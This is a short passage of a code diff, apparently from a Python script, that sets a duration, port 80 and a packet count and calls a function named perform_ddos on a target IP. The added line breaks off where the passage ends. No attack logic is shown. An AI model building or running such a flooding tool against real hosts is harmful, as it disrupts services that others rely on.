@@ -8,4 +8,4 @@ duration = 60
 port = 80
 num_packets = 1000
 
-perform_ddos(target_ip, duration, port, num_packets)
+perform_ddos(target_ip, duration, port, num_pac
